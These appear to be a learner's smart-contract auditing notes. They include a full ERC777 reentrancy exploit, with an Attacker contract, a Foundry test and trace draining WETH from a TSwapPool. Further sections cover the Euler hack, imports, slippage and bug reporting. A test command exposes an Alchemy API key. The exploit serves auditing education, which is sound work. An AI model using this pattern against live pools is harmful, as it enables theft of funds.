This is a key concept in your web3 auditing journey. You need to know that all erc20's dont do the same thing. Whenever you are dealing with a protocol that integrates with ERC20's, you need them to specify which types of ERC20's they are dealing with because different ERC20's have different things that they can do which can potentially break a protocol's invariant. Having knowledge of the different ERC20's that exist will help you know which ones can cause problems. Luckily, ther is a repo where you can see all the weird ERC20's at https://github.com/d-xo/weird-erc20 . You need to review this repo and know about all the oddities that exist in ERC20's.

One of these weird tokens is the ERC777 token standard and you can read about it using the following links:

https://eips.ethereum.org/EIPS/eip-777
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.1/contracts/token/ERC777/ERC777.sol
https://docs.openzeppelin.com/contracts/2.x/erc777
https://eips.ethereum.org/EIPS/eip-1820

I have added a lot of links above as these links are what I used to design my ERC777 token and used it to reenteer the pool and break the protocol invariant. To understand all of this, you need to understand what makes the ERC777 token special. What it does is similar to what a receive or fallback function does for raw ETH transfers. The way it works is pretty simple. There are hooks that can be called whenever an ERC777 token is being sent or received. These hooks are just functions defined in the transfer and transferFrom functions of an ERC777 contract. Lets see an example of this from the ERC777 contract I refactored. I will explain how I did this soon. First thing to note is that ERC777 is an ERC20. If you look at the ERC777.sol contract i designed, you will see how it inherits from ERC20 but it overrides some functions from the normal ERC20 contract like transfer and transferfrom and includes the hooks that allow reentrancy I am talking about. See below:

```javascript
 /**
     * @dev See {IERC20-transferFrom}.
     *
     * Note that operator and allowance concepts are orthogonal: operators cannot
     * call `transferFrom` (unless they have allowance), and accounts with
     * allowance cannot call `operatorSend` (unless they are operators).
     *
     * Emits {Sent}, {IERC20-Transfer} and {IERC20-Approval} events.
     */
    function transferFrom(
        address holder,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        require(
            recipient != address(0),
            "ERC777: transfer to the zero address"
        );
        require(holder != address(0), "ERC777: transfer from the zero address");

        address spender = _msgSender();

        _callTokensToSend(spender, holder, recipient, amount, "", "");
        console.log("time to move");

        _move(spender, holder, recipient, amount, "", "");
        uint256 currentAllowance = _allowances[holder][spender];

        _approve(holder, spender, amount);

        _callTokensReceived(spender, holder, recipient, amount, "", "", false);

        return true;
    }

```

The hooks I am talking about are the \_callTokensToSend and the \_callTokensReceived functions you can see the transferfrom function. we will focus on the \_callTokensToSend hook as that is what i used to perform this exploit. This is what the function looked like:

```javascript
 /**
     * @dev Call from.tokensToSend() if the interface is registered
     * @param operator address operator requesting the transfer
     * @param from address token holder address
     * @param to address recipient address
     * @param amount uint256 amount of tokens to transfer
     * @param userData bytes extra information provided by the token holder (if any)
     * @param operatorData bytes extra information provided by the operator (if any)
     */
    function _callTokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes memory userData,
        bytes memory operatorData
    ) private {
        address implementer = _ERC1820_REGISTRY.getInterfaceImplementer(
            from,
            _TOKENS_SENDER_INTERFACE_HASH
        );
        if (implementer != address(0)) {
            IERC777Sender(implementer).tokensToSend(
                operator,
                from,
                to,
                amount,
                userData,
                operatorData
            );
        }
    }
```

What I want to focus on is the implementer address and the getInterfaceImplementer function. \_callTokensToSend calls a tokensToSend function from another contract and this tokenstosend function in that contract is what performs whatever action we want to happen when our erc777 tokens are about to be sent to another address that calls transferfrom. We dont want this tokenstosend function to get called whenever just anyone calls transferfrom because that will mess up the logic because if someone wants to make a simple transfer, they wont be able to. This is where the implementer contract becomes useful. There is a token standard called ERC1820 and this standard introduces a registry which allows people register addresses that can call hooks. Lets look at how this is done in the ERC777 contract.

```javascript
IERC1820Registry internal constant _ERC1820_REGISTRY =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(
        string memory name,
        string memory symbol,
        address[] memory defaultOperators
    ) {
        _name = name;
        _symbol = symbol;

        _defaultOperatorsArray = defaultOperators;
        for (uint256 i = 0; i < _defaultOperatorsArray.length; i++) {
            _defaultOperators[_defaultOperatorsArray[i]] = true;
        }

        // register interfaces
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            keccak256("ERC777Token"),
            address(this)
        );
        _ERC1820_REGISTRY.setInterfaceImplementer(
            address(this),
            keccak256("ERC20Token"),
            address(this)
        );
    }

```

The first thing that was done was to create an ERC1820 registry contract and the contract was deployed at the address you see above. Note that this contract was only deployed on eth mainnet and sepolia so when i ran my tests, i ran it using a fork of sepolia. This was very important. I knew this because i searched the address on etherscan and sepolia scan and found that they had the same functions that were defined in the eip-1820 link i added above. With this registry, we can register addresses that can implement interfaces. So in the constructor of the ERC777.sol, we registered the contract address as an implementer for IERC777 and IERC20. The IERC20 implementation isnt really necessary but that is how openzeppelin implemented it so i left it as it was. The openzeppelin implementation of ERC777 i have linked above and it was in an old solidity version so i copied the code and updated it to a newer version and made a few tweaks to the code but it is very similar only with updates to match new solidity compiler version.

Now we know that whichever contract inherits from my ERC777.sol will be registered as implementer. You can read the docs to see how the setInterfaceImplementer function is implemented. Lets get back to the getinterfaceimplementer function that is used to call the tokenstosend function. So this tokenstosend function is used in another interface known as IERC777Sender so to call this function, i needed to make a contract that implements this interface. Remember that we cannot just inherit from IERC777Sender because we want to make sure only certain addresses can call the tokenstosend hook which is the whole point of registering addresses with the IERC1820 registry. This is where the Attacker.sol contract comes in. This contract is where i created my tokenstosend function and defined what i wanted it to do. Before i did this, i needed to register the address as an implementer of IERC777Sender like i did in the ERC777 contract. See below:

```javascript
IERC1820Registry private _erc1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    constructor(
        address exchangeAddress,
        address wethtokenAddress,
        address outputtokenaddy
    ) {
        _victimExchange = TSwapPool(exchangeAddress);
        _wethtoken = IERC20(wethtokenAddress);
        _outputtoken = IERC20(outputtokenaddy);
        _attacker = payable(msg.sender);
        // Approve enough tokens to the exchange
        _outputtoken.approve(
            address(_victimExchange),
            tokentosell * _numberOfSales
        );

        // Register interface in ERC1820 registry
        _erc1820.setInterfaceImplementer(
            address(this),
            keccak256("ERC777TokensSender"),
            address(this)
        );
    }
```

This should look familiar. So back to the \_calltokenstosend function, the getinterfaceimplementer checks that the address calling the transferfrom function is registered with the registry. if it isnt, the function will return a zero address. See the getinterfaceimplementer function:

```javascript
 function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address) {
        address addr = _addr == address(0) ? msg.sender : _addr;
        if (isERC165Interface(_interfaceHash)) {
            bytes4 erc165InterfaceHash = bytes4(_interfaceHash);
            return implementsERC165Interface(addr, erc165InterfaceHash) ? addr : address(0);
        }
        return interfaces[addr][_interfaceHash];
    }

```

With this check, only addresses registered to implement the IERC777Sender interface will be able to call tokenstosend which is what we want. Now you understand how ERC777 works for the most part. Lets look at how I used this token to break the invariant and drain funds from the tswap pool. I got motivation for this from the following links:

https://github.com/Consensys/Uniswap-audit-report-2018-12#32-frontrunners-can-skim-25-from-every-transaction-30
https://github.com/OpenZeppelin/exploit-uniswap/blob/master/README.md

The way the attack works is explained in point 3.1 of the first link. The idea is simple. In the tswappool contract, when a swap is being made, the contract calls transferfrom on the input token in order to take an amount of the token from another address. I am sure you can see where this is going. So our entry point is that transferfrom function because when the call is made on our erc777 with attacker.sol as the from address, it will trigger our tokenstosend function which will allow us reenter the contract easily. Lets see what I defined in the tokenstosend function:

```javascript
// ERC777 hook
    function tokensToSend(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external {
        require(
            msg.sender == address(_outputtoken),
            "Hook can only be called by the token"
        );
        _called++;
        console.log("Reentrant call number: ", _called);
        if (_called < _numberOfSales) {
            _callExchange();
        }
    }

    function _callExchange() private {
        _victimExchange.swapExactInput(
            _outputtoken,
            tokentosell,
            _wethtoken,
            minoutputAmount,
            uint64(block.timestamp) // deadline
        );
    }
```

The \_called variable is used to track how many times I want to reenter the transferfrom function with the \_callExchange function and the numberofsales variable is the max amount of times I want to reenter. I used this to avoid an infinite loop.

The \_callExchange function is simply calling the tswappool that has my erc777 token and weth. it is calling the swapexactinput function to swap the erc777 token for weth. Why am i doing this? The idea is that I want to break the invariant and as a result, drain the weth from the pool. So the plan is to call swapexactinput normally in my test and this will call transferfrom in the tswappool contract which will then call this \_callexchange function which will make the swap again BEFORE all the token balances in the tswappool are updated so the token ratio in the pool wont change before i have reentered the pool and made the swap again. Remember that the invariant is that the ratio of tokens x and y in the pool must be the same. if i can enter the function again before all the token balances in the contract are updated, i can skew the ratios using this erc777 which is exactly what I did. If this is confusing, again look at the explanation in the motivation link above as the consensys team explain this perfectly. It will also make sense when you see the test and the result which I will explain below:

```javascript
 function setUp() public {
        weth = new ERC20Mock();

        vm.startPrank(user2);
        erc777token = new ERC777Token();

        pool2 = new TSwapPool(
            address(erc777token),
            address(weth),
            "LTokenB",
            "LB"
        );
        attacker = new Attacker(
            address(pool2),
            address(weth),
            address(erc777token)
        );
        weth.mint(address(attacker), 100e18);
        erc777token.transfer(liquidityProvider, 100e18);
        erc777token.transfer((address(attacker)), 1000e18);
        vm.stopPrank();

        weth.mint(liquidityProvider, 1000e18);
        weth.mint(user2, 100e18);
    }

    function test_ERC777candraincontract() public {
        vm.startPrank(liquidityProvider);
        weth.approve(address(pool2), 100e18);
        erc777token.approve(address(pool2), 100e18);
        pool2.deposit(100e18, 100e18, 100e18, uint64(block.timestamp));
        vm.stopPrank();

        vm.startPrank(address(attacker));
        pool2.swapExactInput(
            erc777token,
            20e18,
            weth,
            16e18,
            uint64(block.timestamp)
        );
        uint256 ethReserves = weth.balanceOf(address(pool2));
        uint256 tokenReserves = erc777token.balanceOf(address(pool2));
        console.log(ethReserves, tokenReserves);
        vm.stopPrank();
    }
```

This was the test I used to prove my earlier explanation. When i ran it with forge test --mt test_ERC777candraincontract -vvvv --fork-url https://eth-sepolia.g.alchemy.com/v2/qI-Bew-erINXNRwv-o7Gdnr5ZFqbSyHv, this was a snippet from the logs and I will use this to explain how it all works. See below:

```javascript
 ├─ [0] VM::startPrank(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422])
    │   └─ ← [Return]
    ├─ [159194] TSwapPool::swapExactInput(ERC777Token: [0xEaA46ff85feBa2BDA844207b3FC21Ec7837Ff9e9], 20000000000000000000 [2e19], ERC20Mock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 16000000000000000000 [1.6e19], 1736106804 [1.736e9])
    │   ├─ [639] ERC777Token::balanceOf(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E]) [staticcall]
    │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   ├─ [559] ERC20Mock::balanceOf(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E]) [staticcall]
    │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   ├─ emit Swap(swapper: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], tokenIn: ERC777Token: [0xEaA46ff85feBa2BDA844207b3FC21Ec7837Ff9e9], amountTokenIn: 20000000000000000000 [2e19], tokenOut: ERC20Mock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amountTokenOut: 16624979156244789061 [1.662e19])
    │   ├─ [126526] ERC777Token::transferFrom(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 20000000000000000000 [2e19])
    │   │   ├─ [2942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   └─ ← [Return] Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422]
    │   │   ├─ [107718] Attacker::tokensToSend(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 20000000000000000000 [2e19], 0x, 0x)
    │   │   │   ├─ [0] console::log("Reentrant call number: ", 1) [staticcall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [70398] TSwapPool::swapExactInput(ERC777Token: [0xEaA46ff85feBa2BDA844207b3FC21Ec7837Ff9e9], 20000000000000000000 [2e19], ERC20Mock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 10000000000000000000 [1e19], 1736106804 [1.736e9])
    │   │   │   │   ├─ [639] ERC777Token::balanceOf(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   │   │   ├─ [559] ERC20Mock::balanceOf(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E]) [staticcall]
    │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   │   │   ├─ emit Swap(swapper: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], tokenIn: ERC777Token: [0xEaA46ff85feBa2BDA844207b3FC21Ec7837Ff9e9], amountTokenIn: 20000000000000000000 [2e19], tokenOut: ERC20Mock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amountTokenOut: 16624979156244789061 [1.662e19])
    │   │   │   │   ├─ [59630] ERC777Token::transferFrom(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 20000000000000000000 [2e19])
    │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422]
    │   │   │   │   │   ├─ [45322] Attacker::tokensToSend(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 20000000000000000000 [2e19], 0x, 0x)
    │   │   │   │   │   │   ├─ [0] console::log("Reentrant call number: ", 2) [staticcall]
    │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   ├─ [41902] TSwapPool::swapExactInput(ERC777Token: [0xEaA46ff85feBa2BDA844207b3FC21Ec7837Ff9e9], 20000000000000000000 [2e19], ERC20Mock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 10000000000000000000 [1e19], 1736106804 [1.736e9])
    │   │   │   │   │   │   │   ├─ [639] ERC777Token::balanceOf(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E]) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   │   │   │   │   │   ├─ [559] ERC20Mock::balanceOf(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E]) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   │   │   │   │   │   │   ├─ emit Swap(swapper: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], tokenIn: ERC777Token: [0xEaA46ff85feBa2BDA844207b3FC21Ec7837Ff9e9], amountTokenIn: 20000000000000000000 [2e19], tokenOut: ERC20Mock: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], amountTokenOut: 16624979156244789061 [1.662e19])
    │   │   │   │   │   │   │   ├─ [26334] ERC777Token::transferFrom(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 20000000000000000000 [2e19])
    │   │   │   │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422]
    │   │   │   │   │   │   │   │   ├─ [2426] Attacker::tokensToSend(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 20000000000000000000 [2e19], 0x, 0x)
    │   │   │   │   │   │   │   │   │   ├─ [0] console::log("Reentrant call number: ", 3) [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   ├─ [0] console::log("time to move") [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   ├─ emit Sent(operator: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], from: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], to: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], amount: 20000000000000000000 [2e19], data: 0x, operatorData: 0x)
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], to: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], value: 20000000000000000000 [2e19])
    │   │   │   │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], spender: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], value: 20000000000000000000 [2e19])
    │   │   │   │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   ├─ [8104] ERC20Mock::transfer(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], 16624979156244789061 [1.662e19])
    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], to: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], value: 16624979156244789061 [1.662e19])
    │   │   │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ [0] console::log("time to move") [staticcall]
    │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   ├─ emit Sent(operator: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], from: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], to: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], amount: 20000000000000000000 [2e19], data: 0x, operatorData: 0x)
    │   │   │   │   │   ├─ emit Transfer(from: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], to: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], value: 20000000000000000000 [2e19])
    │   │   │   │   │   ├─ emit Approval(owner: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], spender: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], value: 20000000000000000000 [2e19])
    │   │   │   │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─ [3304] ERC20Mock::transfer(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], 16624979156244789061 [1.662e19])
    │   │   │   │   │   ├─ emit Transfer(from: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], to: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], value: 16624979156244789061 [1.662e19])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Stop]
    │   │   ├─ [0] console::log("time to move") [staticcall]
    │   │   │   └─ ← [Stop]
    │   │   ├─ emit Sent(operator: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], from: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], to: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], amount: 20000000000000000000 [2e19], data: 0x, operatorData: 0x)
    │   │   ├─ emit Transfer(from: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], to: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], value: 20000000000000000000 [2e19])
    │   │   ├─ emit Approval(owner: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], spender: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], value: 20000000000000000000 [2e19])
    │   │   ├─ [942] 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24::getInterfaceImplementer(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b) [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   └─ ← [Return] true
    │   ├─ [3304] ERC20Mock::transfer(Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], 16624979156244789061 [1.662e19])
    │   │   ├─ emit Transfer(from: TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E], to: Attacker: [0x4df1457D8573567dBEE2479Be13b413dEe2E7422], value: 16624979156244789061 [1.662e19])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 0
    ├─ [559] ERC20Mock::balanceOf(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E]) [staticcall]
    │   └─ ← [Return] 50125062531265632817 [5.012e19]
    ├─ [639] ERC777Token::balanceOf(TSwapPool: [0x9D89111BBa54742d2B54fC3Eb2064E56797cb90E]) [staticcall]
    │   └─ ← [Return] 160000000000000000000 [1.6e20]
    ├─ [0] console::log(50125062531265632817 [5.012e19], 160000000000000000000 [1.6e20]) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    └─ ← [Stop]
```

This might look complicated but it is very easy to see what is going on. All you need to see is that everytime swapexactinput is called via my reentrancy, the balances of both of the tokens in the tswappool are always the same. This is the key part. I have called the swapexactinput function again before any state has been updated so as far as the contract is concerned, the token ratios are still the same. there is still 100e18 of both tokens but in reality, the contract has sent me weth and taken my erc777 but the token balances havent been updated yet due to my reentrancy. As a result, when it is calculating how much weth i should get, it will calculate it based on the input and output reserves it thinks it has which is still 100e18 of both. This allows me to keep swapping my erc777 token for weth at the same price as many times as I want. Once the reeentrancy is over, i logged how much weth and erc777token are in the pool and as you can see, there is about 50e18 of weth and 160e18 of the erc777 token which is not the same ratio as the pool started with. Now instead of a 1 token costing approximately 1 weth, 1 token now costs about 0.3 weth which is significantly cheaper and obviously breaks the core protocol invariant. So i can buy up these tokens for cheap and then go sell them on another similar pool that has a better ratio and profit off that.

This is how ERC777 tokens can be used to reenter functions. This is very key information and a very good example as to why a protocol dealing with ERC20's must take all of these into consideration. There are a lot of other weird erc20's that could potentially break the tswap core invariant and many other protocols invariants so you need to know what all of these are and how they can be used in exploits. You are way more skilled now that you have this knowledge.

# 3 EULER PROTOCOL AND THE DANGERS OF BREAKING INVARIANTS

In case you were wondering about the dangers of breaking invariants, there is a link about the euler protocol hack that stole about 34 million. You can read more about it at:
POC at: github.com/iphelix
Simplified PoC: github.com/tinchoabbate/eth-sec-lab
Tincho yt video: https://www.youtube.com/watch?v=vleHZqDc48M
Coinbase article: coinbase.com/blog/euler-compromise-investigation-part-1-the-exploit

If you look at the article and the tincho video, you will see how euler broke their invariant and they were exploited. The vulnerability was very simple to spot and you would've easily been able to spot this. What is interesting is the way the attacker carried out the attack using smart contracts and exact calculations. They must have had very good insight on flash loans and the euler protocol to be able to do this but you will be able to see how all of this worked in the article and the video so i dont have to explain much. This hack just shows the importance of invariants being maintained at every state of a contract. The function which broke euler's invariant was what crippled them. This is why you need to become an invariant testing master. This is very important.

# 4 LOOK AT WHERE CONTRACTS ARE IMPORTED FROM. DONT IGNORE WHERE CONTRACTS ARE IMPORTED FROM. FAMILIARITY IS DANGEROUS

In the poolfactory.sol contract, i found the following line:

import {IERC20} from "forge-std/interfaces/IERC20.sol";

I saw that it was an IERC20 interface which i was used to seeing from openzeppelin a lot so i thought it was all good. The problem was that this IERC20 interface came from forge-std which isnt openzeppelin and i didnt pay any attention to this and this wasnt an issue this time but a malicious contract could create a similar interface and you think its all good but in reality, there could be hidden functions in the contract so you need to pay attention to EVERY imported contract in the project. This is something I have covered before but you need to remember this.

# 5 MEV AND SLIPPAGE PROTECTION INTRODUCTION

In most of the functions in the TswapPool contract, you will see parameters that ask for minimum amount of something and maximum amount of another thing. For example, in the swapexactInput function, there is a parameter asking the user for a minOutputAmount which is asking the user for the minimum amount of output token they would accept for the transaction. This amount doesnt reflect the actual amount of output tokens they will receive from the swapExactInput function. You might be wondering why the user has to enter a minimum amount when the function calculates how much they get based on the amount of the input token they send to the contract. Remember how we discussed about ratios of tokens A and B in the pool and these ratios are adjusted with every swap (look in the security and auditing notes to learn more about this). So say for example the user1 inputs 1 weth and wants to get 100 dai back. When they send that transaction to the blockchain and it goes to the mempool, a user2 can see this transaction in the mempool and then send a transaction with higher gas calling the same function but saying they want to input 10 weth and get 1000 dai back. User 2's transaction will get processed before user1's and since their swap has gone through, the amounts of each token in the pool have changed which means that there is less dai in the pool making dai more expensive. The calculation for outputAmount will change when user1's transaction is getting processed and this value can be way lower than what user1 was expecting to get. This is why there is a parameter asking the user for a minOutputAmount as if the calculated outputAmount is lower than what the user was expecting, the transaction will revert. In the swapexactOutput function, notice how there is no maxInputAmount parameter. This is a problem for the same reasons explained above. if a big transaction frontruns the users transaction, it will cause a slip in the inputAmount calculation which can lead to the user paying more than they wanted to in order to swap their tokens which can be an issue if the slippage is high. This slip in the calculated outputAmount is what is known as slippage. This is a concept you know a lot about but now you know how this works behind the scenes and what slippage actually means. This minOutputAmount parameter also helps prevent MEV. You dont know what this is right now but in the course, we are going to go over it but just know that there is a reason for this and there is something called MEV which we are going to go over.

All you need to keep in mind for now is that whenever you see 2 tokens being swapped in a function, you need to check that function to make sure there is slippage protection by adding a parameter that allows the user decide a minimum/maximum amount they expect to deposit or receive. This way, the transaction will revert if this limit set by the user is broken via market conditions. Look at the POC I wrote for this in H-4 of the report.md file to see the test I wrote for this.

# 6 INVARIANT REPORTING

This is just a note that whenever you find a bug using invariant testing, when reporting the bug, your POC should present the results of the fuzzing as well as a unit test that mimics the calls the fuzzer made that produced the invariant break. I did this when reporting the invariant error in the report.md of this audit so go check that out. The reason for this is because the person reading the report may not be able to understand the results of fuzzer or invariant testing so it is best to write a simple unit test that the reader can understand the exact calls that are made to break the invariant.
